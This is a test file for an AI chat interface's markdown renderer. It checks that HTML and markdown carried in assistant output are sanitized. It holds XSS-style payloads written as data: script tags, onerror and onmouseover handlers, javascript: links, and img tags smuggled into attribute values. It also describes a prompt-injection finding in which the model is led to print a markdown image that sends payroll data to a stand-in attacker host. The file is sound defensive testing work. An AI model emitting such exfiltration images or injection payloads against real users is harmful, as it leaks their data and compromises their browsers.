/**
 * End-to-end assistant markdown rendering (ChatMessages.renderAssistantMarkdown):
 * markdown → marked → sanitizer, with the entity/reference annotation running
 * INSIDE the sanitizer, on its inert DOM, before the image pass (#428).
 *
 * The assistant's markdown carries tool-result content verbatim (mail bodies,
 * document text), so these cases feed markup through the whole pipeline and
 * assert both halves: nothing executable reaches the returned HTML, and the
 * annotation spans + ordinary markdown still come out the other side.
 *
 * Attribute assertions go through the DOM rather than string matching — the
 * rendered HTML is assigned to `innerHTML`, so "did this become an attribute"
 * is the question that matters, not "does this substring appear".
 */
import { describe, it, expect } from 'vitest'
import { marked } from 'marked'
import type { RetrievalReference } from '@hames-ai/harness-patterns/patterns/retriever.server'
import { sanitizeMarkdownHtml } from '~/lib/sanitize-html'

const { renderAssistantMarkdown } = await import('~/components/ark-ui/ChatMessages')

const noEntities = new Map<string, string[]>()

const reference = (source: string, docId = 'doc-1'): RetrievalReference => ({
  source,
  docId,
  chunkIndex: 0,
  startOffset: 0,
  endOffset: 10,
})

/** Mount rendered HTML the way ChatMessages does, so attributes are real. */
const mount = (html: string): HTMLDivElement => {
  const host = document.createElement('div')
  host.innerHTML = html
  return host
}

/** Every attribute name present anywhere in the rendered fragment. */
const attributeNames = (host: HTMLElement): string[] =>
  [...host.querySelectorAll('*')].flatMap((el) => [...el.attributes].map((a) => a.name))

describe('renderAssistantMarkdown — markup carried in model output', () => {
  it('strips script elements embedded in the message', () => {
    const out = renderAssistantMarkdown(
      'Here is the mail body:\n\n<script>window.stolen = 1</script>\n\nDone.',
      noEntities,
      [],
    )
    expect(out).not.toContain('<script')
    expect(out).not.toContain('window.stolen')
    expect(out).toContain('Done.')
    expect(mount(out).querySelector('script')).toBeNull()
  })

  it('strips onerror handlers from images but keeps the image', () => {
    // A source the sanitizer allows (the Data Stash download route), so the
    // image survives and this stays a test of the handler strip. It was
    // `x.png` until #415 D13 refused every other source.
    const src = '/api/stash/document/doc-1?sessionId=s1&download'
    const out = renderAssistantMarkdown(
      `<img src="${src}" onerror="window.stolen = 1">`,
      noEntities,
      [],
    )
    const img = mount(out).querySelector('img')
    expect(img).not.toBeNull()
    expect(img!.getAttribute('src')).toBe(src)
    expect(img!.hasAttribute('onerror')).toBe(false)
  })

  it('neutralises javascript: links written as markdown', () => {
    const out = renderAssistantMarkdown('[click me](javascript:window.stolen=1)', noEntities, [])
    expect(out).not.toContain('javascript:')
    expect(mount(out).querySelector('a')?.getAttribute('href') ?? '').not.toContain('javascript:')
    expect(out).toContain('click me')
  })

  it('leaves the ordinary markdown feature set intact', () => {
    const md = [
      '## Report',
      '',
      '**bold** and *italic* and `inline`',
      '',
      '```js',
      'const a = 1',
      '```',
      '',
      '| col | val |',
      '| :-- | --: |',
      '| a   | 1   |',
      '',
      '- item one',
      '- item two',
      '',
      '> quoted',
      '',
      '[docs](https://example.test/docs)',
    ].join('\n')
    const out = renderAssistantMarkdown(md, noEntities, [])

    expect(out).toContain('<h2>Report</h2>')
    expect(out).toContain('<strong>bold</strong>')
    expect(out).toContain('<em>italic</em>')
    expect(out).toContain('<code>inline</code>')
    expect(out).toContain('class="language-js"')
    expect(out).toContain('const a = 1')
    expect(out).toContain('<table>')
    expect(out).toContain('align="left"')
    expect(out).toContain('<li>item one</li>')
    expect(out).toContain('<blockquote>')
    expect(out).toContain('href="https://example.test/docs"')
  })
})

describe('renderAssistantMarkdown — a remote image in the answer does not load (#415 D13)', () => {
  // The finding, end to end: an injected instruction makes the model print a
  // markdown image whose URL carries data, and rendering the answer used to
  // fetch it. Every markdown spelling of an image goes through marked's `<img>`,
  // so each is asserted through the whole pipeline rather than at the sanitizer.
  const exfil = 'https://attacker.example/p.png?d=Q3-payroll-total'
  const spellings: Array<[string, string]> = [
    ['an inline image', `Summary done. ![chart](${exfil})`],
    ['a reference-style image', `Summary done. ![chart][r]\n\n[r]: ${exfil}`],
    ['an image inside a link', `[![badge](${exfil})](https://example.test/)`],
    ['a raw <img> in the answer', `Summary done. <img src="${exfil}">`],
  ]

  it.each(spellings)('%s renders as a placeholder, never an <img>', (_label, md) => {
    const host = mount(renderAssistantMarkdown(md, noEntities, []))

    expect(host.querySelector('img')).toBeNull()
    const placeholder = host.querySelector('span.blocked-image')
    expect(placeholder?.textContent).toBe(`Image blocked: ${exfil}`)
    // No attribute anywhere still carries the URL — the anchor's href in the
    // link case is a different URL, and loads only on a click.
    expect(attributeNames(host)).not.toContain('src')
    expect(host.innerHTML).not.toMatch(/(src|srcset|style)="[^"]*attacker/)
  })

  it('survives entity annotation, which runs before the image pass', () => {
    // The annotators wrap text nodes of the sanitized DOM. The image pass runs
    // after them, so nothing they do can bring an image back.
    const host = mount(
      renderAssistantMarkdown(`Acme results ![x](${exfil})`, new Map([['Acme', ['n1']]]), []),
    )

    expect(host.querySelector('img')).toBeNull()
    expect(host.querySelector('span.blocked-image')).not.toBeNull()
    expect(host.querySelector('.graph-entity')?.textContent).toBe('Acme')
  })
})

describe('renderAssistantMarkdown — links open in a new tab', () => {
  // The standing UI rule reaches the chat through the sanitizer hook, so this
  // asserts it end to end: a plain markdown link comes out of the pipeline
  // ready to open elsewhere, with the `window.opener` hole closed. The
  // repo-wide guard for hand-written anchors is `src/__tests__/links-new-tab.test.ts`.
  it('stamps target and rel on a markdown link', () => {
    const link = mount(
      renderAssistantMarkdown('See [the docs](https://example.test/docs).', noEntities, []),
    ).querySelector('a')

    expect(link).not.toBeNull()
    expect(link!.getAttribute('target')).toBe('_blank')
    expect(link!.getAttribute('rel')).toBe('noopener noreferrer')
    expect(link!.getAttribute('href')).toBe('https://example.test/docs')
  })

  it('stamps them on a raw anchor carried in the model output too', () => {
    const link = mount(
      renderAssistantMarkdown(
        'From the mail body: <a href="https://example.test/x" target="_self">x</a>',
        noEntities,
        [],
      ),
    ).querySelector('a')

    expect(link!.getAttribute('target')).toBe('_blank')
    expect(link!.getAttribute('rel')).toBe('noopener noreferrer')
  })
})

describe('renderAssistantMarkdown — annotation spans', () => {
  it('annotates known entity names and keeps the span hooks', () => {
    const entities = new Map<string, string[]>([['Acme Corp', ['n1', 'n2']]])
    const span = mount(
      renderAssistantMarkdown('We looked into Acme Corp today.', entities, []),
    ).querySelector('.graph-entity')

    expect(span).not.toBeNull()
    expect(span!.getAttribute('data-entity-name')).toBe('Acme Corp')
    expect(span!.getAttribute('data-entity-ids')).toBe('n1,n2')
    expect(span!.textContent).toBe('Acme Corp')
  })

  it('annotates cited filenames and keeps the citation superscript', () => {
    const host = mount(
      renderAssistantMarkdown('See notes.md for the detail.', noEntities, [reference('notes.md')]),
    )
    const span = host.querySelector('.doc-ref')

    expect(span).not.toBeNull()
    expect(span!.getAttribute('data-doc-id')).toBe('doc-1')
    expect(span!.getAttribute('title')).toBe('Open notes.md in viewer')
    // The mark is an empty <sup> carrying an icon utility class — it was a "↗"
    // character until the emoji sweep, so an empty textContent is the point.
    const mark = host.querySelector('sup.doc-ref-mark')
    expect(mark?.textContent).toBe('')
    expect(mark?.classList.contains('i-material-symbols-arrow-outward')).toBe(true)
  })

  it('escapes a quote in a document id instead of letting it open a new attribute', () => {
    const docId = 'doc" onmouseover="window.stolen=1'
    const host = mount(
      renderAssistantMarkdown('See notes.md for the detail.', noEntities, [
        reference('notes.md', docId),
      ]),
    )

    expect(host.querySelector('.doc-ref')?.getAttribute('data-doc-id')).toBe(docId)
    expect(attributeNames(host)).not.toContain('onmouseover')
  })

  // The filename lands in the citation `title`. It used to be escaped into an
  // interpolated string; since #428 the annotator sets the attribute through
  // the DOM, so there is no escaper left to pin. What holds either way, and is
  // pinned here, is the outcome: the value arrives verbatim, as one attribute.
  it('carries a quote in a filename into the citation title as a value, not markup', () => {
    const source = 'q1" onmouseover="window.stolen=1" x="report.pdf'
    const host = mount(
      renderAssistantMarkdown(`Summary of ${source} attached.`, noEntities, [reference(source)]),
    )

    expect(host.querySelector('.doc-ref')?.getAttribute('title')).toBe(`Open ${source} in viewer`)
    expect(attributeNames(host)).not.toContain('onmouseover')
    expect(attributeNames(host)).not.toContain('x')
  })

  it('escapes quotes in entity ids instead of letting them open a new attribute', () => {
    const entities = new Map<string, string[]>([['Acme', ['n1" onmouseover="window.stolen=1']]])
    const host = mount(renderAssistantMarkdown('We looked into Acme today.', entities, []))

    expect(host.querySelector('.graph-entity')?.getAttribute('data-entity-ids')).toBe(
      'n1" onmouseover="window.stolen=1',
    )
    expect(attributeNames(host)).not.toContain('onmouseover')
  })
})

// ============================================================================
// #428: annotation must never re-parse the sanitized HTML
// ============================================================================
//
// The annotators used to run on the sanitizer's SERIALIZED output. They split
// it with `/(<[^>]+>)/` and rewrote the "text" pieces, which assumes no `>`
// inside an attribute value. jsdom (this layer) serializes `<` and `>` in
// attribute values raw. So a `>` in a title or alt made the tail of the
// attribute look like text, and the annotator's own `"` then closed the
// attribute. Whatever the sanitizer had judged an attribute STRING came back
// as live markup: an `<img>` the image pass never saw, and an anchor that lost
// the `target`/`rel` the link rule stamps. Current Chromium, WebKit and
// Firefox escape both characters there. Older engines do not.
//
// Each payload below is asserted three ways, all through the DOM:
//   - no element loads the attacker host;
//   - every link still carries the link rule's `target` and `rel`;
//   - with the annotation spans unwrapped, the fragment is EXACTLY what the
//     sanitizer produced for the same answer with nothing to annotate. In
//     other words, annotation wrapped text and changed nothing else.

const ATTACKER = 'attacker.example'
const STASH_IMAGE = '/api/stash/document/doc-1?sessionId=s1&download'
const acme = new Map<string, string[]>([['Acme', ['n1']]])

/** The fragment with every annotation span unwrapped and its mark removed. */
const withoutAnnotations = (host: HTMLElement): string => {
  host.querySelectorAll('sup.doc-ref-mark').forEach((mark) => mark.remove())
  host
    .querySelectorAll('span.graph-entity, span.doc-ref')
    .forEach((span) => span.replaceWith(...span.childNodes))
  return host.innerHTML
}

/** Every element in the fragment whose `src` would fetch from the attacker. */
const attackerLoads = (host: HTMLElement): string[] =>
  [...host.querySelectorAll('[src]')]
    .filter((el) => el.getAttribute('src')!.includes(ATTACKER))
    .map((el) => el.outerHTML)

describe('renderAssistantMarkdown: annotation cannot turn an attribute back into markup (#428)', () => {
  it('runs where the hazard is real: jsdom still leaves `>` raw in an attribute value', () => {
    // Positive control. The payloads below discriminate only while this holds.
    // If a jsdom upgrade starts escaping `>` here, a restored regex split
    // would pass them, so delete or replace them then. The decoded-text cases
    // in the next block do not depend on the serializer and keep
    // discriminating.
    expect(sanitizeMarkdownHtml('<span title="a>b">x</span>')).toContain('title="a>b"')
  })

  const payloads: Array<[string, string, Map<string, string[]>, RetrievalReference[]]> = [
    [
      'the issue payload: a link title holding `>` and an entity name',
      `[ok](https://ok.test/ "x>Acme <img src=https://${ATTACKER}/p.png?d=S>")`,
      acme,
      [],
    ],
    [
      'the same through a cited filename',
      `[ok](https://ok.test/ "x>report.pdf <img src=https://${ATTACKER}/p.png?d=S>")`,
      noEntities,
      [reference('report.pdf')],
    ],
    [
      'alt text on an allowed stash image',
      `![x>Acme <img src=https://${ATTACKER}/p.png?d=S>](${STASH_IMAGE})`,
      acme,
      [],
    ],
    [
      'a raw element other than a link, holding `>` in its title',
      `<span title="x>Acme <img src=//${ATTACKER}/s.png>">y</span>`,
      acme,
      [],
    ],
    [
      'entity-encoded tags in a markdown title',
      `[ok](https://ok.test/ "x&gt;Acme &lt;img src=https://${ATTACKER}/p.png?d=S&gt;")`,
      acme,
      [],
    ],
    [
      'entity-encoded tags in a raw anchor title, decimal and hex',
      `<a href="https://ok.test/" title="x&gt;Acme &#60;img src=//${ATTACKER}/p.png&#x3e;">ok</a>`,
      acme,
      [],
    ],
    [
      'a tag opened before a citation chip and closed by the anchor after it',
      `[ok](https://ok.test/ "x>report.pdf <img src=//${ATTACKER}/p.png?d=S")`,
      noEntities,
      [reference('report.pdf')],
    ],
    [
      'a tag opened before an entity span and closed by the anchor after it',
      `[ok](https://ok.test/ "x>Acme <img src=//${ATTACKER}/p.png?d=S")`,
      acme,
      [],
    ],
    [
      'nested quotes in a single-quoted raw title',
      `<a href="https://ok.test/" title='x>Acme "y" <img src=//${ATTACKER}/q.png>'>ok</a>`,
      acme,
      [],
    ],
    [
      'nested quotes in a markdown title',
      `[ok](https://ok.test/ 'x>Acme "y" <img src=//${ATTACKER}/q.png>')`,
      acme,
      [],
    ],
    [
      'both annotators inside one attribute',
      `[ok](https://ok.test/ "x>Acme report.pdf <img src=//${ATTACKER}/b.png>")`,
      acme,
      [reference('report.pdf')],
    ],
  ]

  it.each(payloads)('%s', (_label, md, entities, references) => {
    const host = mount(renderAssistantMarkdown(md, entities, references))
    const plain = mount(renderAssistantMarkdown(md, noEntities, [])).innerHTML

    expect(attackerLoads(host)).toEqual([])
    for (const a of host.querySelectorAll('a')) {
      expect(a.getAttribute('target')).toBe('_blank')
      expect(a.getAttribute('rel')).toBe('noopener noreferrer')
    }
    expect(withoutAnnotations(host)).toBe(plain)
  })

  it('still annotates the prose beside a hostile attribute', () => {
    const host = mount(
      renderAssistantMarkdown(
        `Acme and report.pdf: [ok](https://ok.test/ "x>Acme report.pdf <img src=//${ATTACKER}/b.png>")`,
        acme,
        [reference('report.pdf')],
      ),
    )

    // One of each, both in the paragraph's own text, none inside the anchor.
    expect([...host.querySelectorAll('.graph-entity')].map((s) => s.textContent)).toEqual(['Acme'])
    expect([...host.querySelectorAll('.doc-ref')].map((s) => s.textContent)).toEqual(['report.pdf'])
    expect(host.querySelector('a .graph-entity, a .doc-ref')).toBeNull()
    expect(host.querySelector('a')!.getAttribute('title')).toBe(
      `x>Acme report.pdf <img src=//${ATTACKER}/b.png>`,
    )
    // The pass runs after DOMPurify and the link rule, so nothing re-judges
    // what it adds. Pin that it adds these attributes and no others.
    expect(
      [...host.querySelectorAll('.graph-entity, .doc-ref, .doc-ref-mark')].map(
        (el) => `${el.nodeName} ${el.getAttributeNames().sort().join(' ')}`,
      ),
    ).toEqual([
      'SPAN class data-entity-ids data-entity-name title',
      'SPAN class data-doc-id title',
      'SUP aria-hidden class',
    ])
  })
})

describe('renderAssistantMarkdown: annotation reads the text the reader sees (#428)', () => {
  // These do not depend on how jsdom serializes attributes. A pass over the
  // serialized string sees `&lt;` and `&amp;` where the reader sees `<` and
  // `&`, so it splits character references and misses names that contain one.

  it('does not split a character reference that spells an entity name', () => {
    const host = mount(
      renderAssistantMarkdown(
        `if a &lt;img src=//${ATTACKER}/x&gt; b then lt wins`,
        new Map([
          ['lt', ['n1']],
          ['gt', ['n2']],
        ]),
        [],
      ),
    )

    expect(host.querySelector('p')!.textContent).toBe(
      `if a <img src=//${ATTACKER}/x> b then lt wins`,
    )
    expect([...host.querySelectorAll('.graph-entity')].map((s) => s.textContent)).toEqual(['lt'])
    expect(host.querySelector('img')).toBeNull()
  })

  it('inserts a name or filename that spells markup as text, never as markup', () => {
    // The pass now sees decoded text, so `<` reaches the annotators. They must
    // put it back as text.
    const name = '<b onmouseover="window.stolen=1">Acme</b>'
    const file = `<a href="//${ATTACKER}/f">report</a>.pdf`
    const host = mount(
      renderAssistantMarkdown(
        `x&lt;b onmouseover="window.stolen=1"&gt;Acme&lt;/b&gt;y, ` +
          `x&lt;a href="//${ATTACKER}/f"&gt;report&lt;/a&gt;.pdf y`,
        new Map([[name, ['n1']]]),
        [reference(file)],
      ),
    )

    expect(host.querySelector('.graph-entity')?.textContent).toBe(name)
    expect(host.querySelector('.doc-ref')?.textContent).toBe(file)
    // Nothing inside either span but the citation's own mark.
    expect(
      [...host.querySelectorAll('.graph-entity *, .doc-ref *')].map((el) => el.nodeName),
    ).toEqual(['SUP'])
    expect(attributeNames(host)).not.toContain('onmouseover')
  })

  it('annotates a name that contains an ampersand', () => {
    const host = mount(renderAssistantMarkdown('AT&T reported.', new Map([['AT&T', ['n1']]]), []))

    expect(host.querySelector('.graph-entity')?.getAttribute('data-entity-name')).toBe('AT&T')
    expect(host.querySelector('p')!.textContent).toBe('AT&T reported.')
  })

  it('leaves the text of a refused image alone: the placeholder is built after annotation', () => {
    const host = mount(
      renderAssistantMarkdown(`Acme: ![c](https://${ATTACKER}/Acme.png)`, acme, []),
    )

    expect(host.querySelector('.blocked-image')?.textContent).toBe(
      `Image blocked: https://${ATTACKER}/Acme.png`,
    )
    expect(host.querySelector('.blocked-image .graph-entity')).toBeNull()
    expect(host.querySelectorAll('.graph-entity')).toHaveLength(1)
  })

  it('leaves a match the name lookup cannot resolve as text, rather than throwing', () => {
    // The regex's `i` flag matches final sigma against σ; `toLowerCase` does not.
    const host = mount(renderAssistantMarkdown('Aςb and Aσb', new Map([['Aσ', ['n1']]]), []))

    expect([...host.querySelectorAll('.graph-entity')].map((s) => s.textContent)).toEqual(['Aσ'])
    expect(host.querySelector('p')!.textContent).toBe('Aςb and Aσb')
  })

  it('skips code spans and code blocks, as before', () => {
    const host = mount(renderAssistantMarkdown('Acme `Acme` and\n\n```\nAcme\n```', acme, []))

    expect(
      [...host.querySelectorAll('.graph-entity')].map((s) => s.parentElement!.nodeName),
    ).toEqual(['P'])
  })
})

describe('renderAssistantMarkdown — link destinations containing spaces', () => {
  // A filename copied verbatim from a tool result is the usual source. CommonMark
  // ends a destination at the first space, so these used to render as literal
  // `[text](url…)` with a stray autolink. Synthetic names throughout.
  const anchors = (md: string) => [
    ...mount(renderAssistantMarkdown(md, noEntities, [])).querySelectorAll('a'),
  ]

  it('links a filename containing spaces, encoding only the spaces', () => {
    const [a, ...rest] = anchors('[Q3 notes](https://files.example.test/docs/Meeting Notes Q3.pdf)')

    expect(rest).toHaveLength(0)
    expect(a.getAttribute('href')).toBe('https://files.example.test/docs/Meeting%20Notes%20Q3.pdf')
    expect(a.textContent).toBe('Q3 notes')
    expect(a.getAttribute('target')).toBe('_blank')
    expect(a.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('keeps a "(1)" in the filename inside the destination', () => {
    const md = 'See [copy](https://files.example.test/docs/Budget draft (1).xlsx) now.'
    const host = mount(renderAssistantMarkdown(md, noEntities, []))
    const links = host.querySelectorAll('a')

    expect(links).toHaveLength(1)
    expect(links[0].getAttribute('href')).toBe(
      'https://files.example.test/docs/Budget%20draft%20(1).xlsx',
    )
    expect(host.textContent?.trim()).toBe('See copy now.')
  })

  it('never decodes: an existing %20 or %2F stays as written', () => {
    const [a] = anchors('[x](https://files.example.test/a%2Fb/c%20d e.pdf)')

    expect(a.getAttribute('href')).toBe('https://files.example.test/a%2Fb/c%20d%20e.pdf')
  })

  it('leaves a code span containing such a link as code', () => {
    const host = mount(
      renderAssistantMarkdown('`[x](https://files.example.test/a b.pdf)`', noEntities, []),
    )

    expect(host.querySelector('a')).toBeNull()
    expect(host.querySelector('code')!.textContent).toBe('[x](https://files.example.test/a b.pdf)')
  })

  it('keeps a code span in the link text as code', () => {
    const [a] = anchors('[`Plan]v2.docx`](https://files.example.test/Plan v2.docx)')

    expect(a.getAttribute('href')).toBe('https://files.example.test/Plan%20v2.docx')
    expect(a.querySelector('code')!.textContent).toBe('Plan]v2.docx')
  })

  it('keeps javascript: inert end to end, spaces or not', () => {
    // Without spaces the sanitizer drops the href; with spaces the text stays
    // literal. Either way no anchor carries the scheme.
    for (const md of ['[x](javascript:window.stolen=1)', '[x](javascript:window.stolen = 1)']) {
      const host = mount(renderAssistantMarkdown(md, noEntities, []))

      expect(host.querySelector('a')?.getAttribute('href') ?? '').not.toContain('javascript:')
      expect(host.querySelector('[href], [src]')?.getAttribute('href') ?? '').not.toContain(
        'javascript',
      )
    }
  })

  it('does not turn a spaced image into a loadable <img>', () => {
    // The tokenizer rewrites the image too, so the sanitizer's image policy is
    // what blocks it: a placeholder with the whole encoded URL, no anchor. With
    // images unhandled the lexer re-enters at the `[` and renders `!<a>…</a>`.
    const host = mount(
      renderAssistantMarkdown('![chart](https://files.example.test/my chart.png)', noEntities, []),
    )

    expect(host.querySelector('img')).toBeNull()
    expect(host.querySelector('a')).toBeNull()
    expect(host.querySelector('.blocked-image')?.textContent).toBe(
      'Image blocked: https://files.example.test/my%20chart.png',
    )
  })

  it('leaves a plain link, and a link with a title, to the default tokenizer', () => {
    const [plain] = anchors('[docs](https://example.test/a/b.pdf)')
    const [titled] = anchors('[docs](https://example.test/a "the docs")')

    expect(plain.getAttribute('href')).toBe('https://example.test/a/b.pdf')
    expect(titled.getAttribute('href')).toBe('https://example.test/a')
    expect(titled.getAttribute('title')).toBe('the docs')
  })

  it('lets the default tokenizer keep a parenthesised title', () => {
    const [a] = anchors('[docs](https://example.test/a (the docs))')

    expect(a.getAttribute('href')).toBe('https://example.test/a')
    expect(a.getAttribute('title')).toBe('the docs')
  })

  it('does not fold a trailing quoted title into a spaced destination', () => {
    const hrefs = anchors('[x](https://files.example.test/a b.pdf "title")').map((a) =>
      a.getAttribute('href'),
    )

    expect(hrefs.join()).not.toMatch(/%22|"/)
  })

  it('only rewrites http(s) destinations', () => {
    const hrefs = anchors('[x](ftp://files.example.test/a b.pdf)').map((a) =>
      a.getAttribute('href'),
    )

    expect(hrefs).not.toContain('ftp://files.example.test/a%20b.pdf')
  })

  it('leaves an unterminated destination as text', () => {
    expect(anchors('[x](https://files.example.test/a b.pdf')).toHaveLength(1) // the autolinked prefix only
    expect(anchors('[x](https://files.example.test/a b.pdf')[0].textContent).toBe(
      'https://files.example.test/a',
    )
  })

  it('does not count an escaped paren when balancing the destination', () => {
    const [a] = anchors('[x](https://files.example.test/a\\(b c)')

    expect(a.getAttribute('href')).toBe('https://files.example.test/a(b%20c')
  })

  it('reads nested brackets in the label', () => {
    const [a] = anchors('[a [b] c](https://files.example.test/a b)')

    expect(a.textContent).toBe('a [b] c')
    expect(a.getAttribute('href')).toBe('https://files.example.test/a%20b')
  })

  it('reads an escaped bracket in the label', () => {
    const [a] = anchors('[a\\]b](https://files.example.test/a b)')

    expect(a.textContent).toBe('a]b')
    expect(a.getAttribute('href')).toBe('https://files.example.test/a%20b')
  })

  it('matches the scheme case-insensitively', () => {
    const [a] = anchors('[x](HTTPS://files.example.test/a b)')

    expect(a.getAttribute('href')).toBe('HTTPS://files.example.test/a%20b')
  })

  it('does not fold a quoted title followed by a trailing space into the destination', () => {
    const hrefs = anchors('[x](https://files.example.test/a b "t" )').map((a) =>
      a.getAttribute('href'),
    )

    expect(hrefs.join()).not.toMatch(/%22|"/)
  })

  // The two caps, pinned at their exact edges: at the cap the link is read, one
  // past it the default tokenizer decides (and it ends the destination at the
  // space). Nothing here depends on timing.
  const spaced = 'https://files.example.test/a%20b'

  it.each([
    [999, true],
    [1000, false],
  ])('a link label of %i characters is read: %s', (n, linked) => {
    const hrefs = anchors(`[${'a'.repeat(n)}](https://files.example.test/a b)`).map((a) =>
      a.getAttribute('href'),
    )

    expect(hrefs.includes(spaced)).toBe(linked)
  })

  it.each([
    [2048, true],
    [2049, false],
  ])('a link destination of %i characters is read: %s', (n, linked) => {
    const prefix = 'https://files.example.test/'
    const dest = `${prefix}${'a'.repeat(n - prefix.length - 2)} b`
    const hrefs = anchors(`[x](${dest})`).map((a) => a.getAttribute('href'))

    expect(dest).toHaveLength(n)
    expect(hrefs.some((h) => h?.endsWith('%20b'))).toBe(linked)
  })

  it('does not read a destination across a line break', () => {
    const hrefs = anchors('[x](https://files.example.test/a b\nc.pdf)').map((a) =>
      a.getAttribute('href'),
    )

    expect(hrefs.join()).not.toContain('%20b')
  })
})

describe('renderAssistantMarkdown — unterminated link-shaped input is bounded', () => {
  // The lexer asks the tokenizer at every `[`. Unbounded, each ask walked to the
  // end of the paragraph: quadratic, on the main thread, on every reload of the
  // persisted history. The caps are pinned exactly above; this is the one coarse
  // end-to-end check, an ABSOLUTE bound run once. Ratios between two timings
  // flaked on cold and loaded runs and are not used.
  //
  // The input is sparse on purpose (one `[` per 400 characters): the cost with
  // the cap is one bounded scan per `[`, the cost without it is one scan to the
  // end per `[`, so a large input with few asks keeps the capped cost tiny and
  // the uncapped one huge. Measured on this machine, 2 MB / 5 000 asks: ~0.1 s
  // capped, ~0.3 s capped under the v8 coverage run, ~15 s with the label cap
  // removed. 1.5 s sits 5x above the slowest capped run and 10x below the
  // uncapped one.
  it('renders 2 MB of widely spaced unclosed labels in under 1.5 seconds', () => {
    const md = `${'a'.repeat(399)}[`.repeat(5_000)
    const t0 = performance.now()
    marked.parse(md, { async: false })

    expect(performance.now() - t0).toBeLessThan(1_500)
  }, 120_000)
})
